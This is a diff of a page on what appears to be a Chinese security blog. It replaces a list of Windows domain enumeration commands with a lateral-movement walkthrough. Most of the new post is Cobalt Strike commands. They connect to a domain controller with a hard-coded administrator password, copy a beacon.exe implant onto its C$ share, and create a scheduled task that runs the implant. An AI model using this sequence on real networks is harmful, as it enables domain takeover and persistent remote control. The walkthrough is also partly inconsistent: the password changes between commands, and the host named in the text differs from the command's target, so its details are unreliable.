@@ -6,15 +6,26 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>域操作基本命令 | 0pen1的博客</title>
+  <title>横向移动 | 0pen1的博客</title>
   <meta name="author" content="0pen1">
   
-  <meta name="description" content="域操作基础命令12345678910111213141516171819202122net group &amp;#x2F;domain                 获得所有域用户组列表net group xxxxx &amp;#x2F;domain              显示域中xxxxx组的成员net group xxxxx &amp;#x2F;del &amp;#x2F;domain           删除域中xxxxx组net group xxxxx xy &amp;#x2F;del &amp;#x2F;domain          删除域内xxxxx 群组中的xy成员net group xxxxx &amp;#x2F;add &amp;#x2F;domain           增加域中的群组net group &amp;quot;domain admins&amp;quot; &amp;#x2F;domain         获得域管理员列表net group &amp;quot;enterprise admins&amp;quot; &amp;#x2F;domain       获得企业管理员列表net localgroup administrators &amp;#x2F;domain       获取域内置administrators组用（enterprise admins、domain admins）net group &amp;quot;domain controllers&amp;quot; &amp;#x2F;domain      获得域控制器列表net group &amp;quot;domain computers&amp;quot; &amp;#x2F;domain       获得所有域成员计算机列表net user &amp;#x2F;domain                 获得所有域用户列表net user xxxx &amp;#x2F;domain               获得指定账户xxxx的详细信息net accounts &amp;#x2F;domain               获得域密码策略设置，密码长短，错误锁定等信息net view &amp;#x2F;domain                 查询有几个域, 查询域列表net view &amp;#x2F;domain:xxxx               查看 xxxx域中的计算机列表nltest &amp;#x2F;domain_trusts               获取域信任信息net user domain-admin &amp;#x2F;domain           查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息net config Workstation              查询机器属于哪个域net time &amp;#x2F;domian                 查询主域服务器的时间echo %logonserver%                查看登陆到这台服务器的计算机名gpupdate&amp;#x2F;force                  更新域策略tasklist &amp;#x2F;S ip &amp;#x2F;U domain\username &amp;#x2F;P &amp;#x2F;V      查看远程计算机进程"> 
+  <meta name="description" content="横向移动对 DC(10.10.10.2)目标主机建立共享连接，并查看目标主机共享资源。
+12shell net use \\10.10.10.2 /user:administrator &amp;quot;JDredteam666&amp;quot;shell net view \\10.10.10.2
+
+
+列出目标主机 C 盘下目录文件。
+1shell dir \\10.10.10.2\C$
+
+
+将CS木马上传到跳板机。
+1upload C:\Users\asus\Desktop\beacon.exe (C:\Users\Server\Desktop\beacon.exe)
+
+将server(192.168.111.3)跳板机的木马文件copy到DC(10.10.10.2)目标机的C共享盘下。"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="域操作基本命令"/>
+  <meta property="og:title" content="横向移动"/>
   <meta property="og:site_name" content="0pen1的博客"/>
 
   
@@ -105,7 +116,7 @@
 
 	
 		<div class="page-header">
-			<h1> 域操作基本命令</h1>
+			<h1> 横向移动</h1>
 		</div>
 	
 
@@ -122,8 +133,25 @@
 	<div class="mypage">		
 	  		
 
-	  <h1 id="域操作基础命令"><a href="#域操作基础命令" class="headerlink" title="域操作基础命令"></a>域操作基础命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain                 获得所有域用户组列表</span><br><span class="line">net group xxxxx &#x2F;domain              显示域中xxxxx组的成员</span><br><span class="line">net group xxxxx &#x2F;del &#x2F;domain           删除域中xxxxx组</span><br><span class="line">net group xxxxx xy &#x2F;del &#x2F;domain          删除域内xxxxx 群组中的xy成员</span><br><span class="line">net group xxxxx &#x2F;add &#x2F;domain           增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain         获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; &#x2F;domain       获得企业管理员列表</span><br><span class="line">net localgroup administrators &#x2F;domain       获取域内置administrators组用（enterprise admins、domain admins）</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain      获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain       获得所有域成员计算机列表</span><br><span class="line">net user &#x2F;domain                 获得所有域用户列表</span><br><span class="line">net user xxxx &#x2F;domain               获得指定账户xxxx的详细信息</span><br><span class="line">net accounts &#x2F;domain               获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">net view &#x2F;domain                 查询有几个域, 查询域列表</span><br><span class="line">net view &#x2F;domain:xxxx               查看 xxxx域中的计算机列表</span><br><span class="line">nltest &#x2F;domain_trusts               获取域信任信息</span><br><span class="line">net user domain-admin &#x2F;domain           查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</span><br><span class="line">net config Workstation              查询机器属于哪个域</span><br><span class="line">net time &#x2F;domian                 查询主域服务器的时间</span><br><span class="line">echo %logonserver%                查看登陆到这台服务器的计算机名</span><br><span class="line">gpupdate&#x2F;force                  更新域策略</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V      查看远程计算机进程</span><br></pre></td></tr></table></figure>
+	  <h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>对 DC(10.10.10.2)目标主机建立共享连接，并查看目标主机共享资源。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.2 /user:administrator <span class="string">&quot;JDredteam666&quot;</span></span><br><span class="line">shell net view \\10.10.10.2</span><br></pre></td></tr></table></figure>
 
+<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170638929.png" alt="image-20210109170638929"></p>
+<p>列出目标主机 C 盘下目录文件。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.2\C$</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109170959454.png" alt="image-20210109170959454"></p>
+<p>将CS木马上传到跳板机。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload C:\Users\asus\Desktop\beacon.exe (C:\Users\Server\Desktop\beacon.exe)</span><br></pre></td></tr></table></figure>
+
+<p>将server(192.168.111.3)跳板机的木马文件copy到DC(10.10.10.2)目标机的C共享盘下。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Users\Server\Desktop\beacon.exe \\10.10.10.2\C$</span><br></pre></td></tr></table></figure>
+
+<p>远程创建Win 2012(192.168.200.66)目标机计划任务执行木马文件。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell schtasks /create /s 10.10.10.2 /u administrator /p <span class="string">&quot;JDredteam&quot;</span> /sc MINUTE /mo 1 /tn <span class="built_in">test</span> /tr <span class="string">&quot;C:\\beacon.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功上线，该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会断掉。</p>
+<p><img src="%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210109202117004.png" alt="image-20210109202117004"></p>
 
 	  <div class="article-footer-copyright">
 
@@ -133,7 +161,7 @@
 	</div>
 
 	
-	<span id="/2021/04/20/%E5%9F%9F%E6%93%8D%E4%BD%9C%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/" class="leancloud-visitors view" data-flag-title="域操作基本命令">
+	<span id="/2021/04/20/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="leancloud-visitors view" data-flag-title="横向移动">
 		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
 	</span>
 	
@@ -144,13 +172,12 @@
 
     
     
-    <a href="/2021/04/20/横向移动/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2021/04/20/Linux利用iptables做端口复用/" type="button" class="btn btn-default ">Next<i
+    <a href="/2021/04/20/域操作基本命令/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -231,7 +258,7 @@ new Valine(valineConfig);
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/域/">域<span>1</span></a></li>
+  <li><a href="/tags/横向移动/">横向移动<span>1</span></a></li>
     </ul>
 	</div>
 		
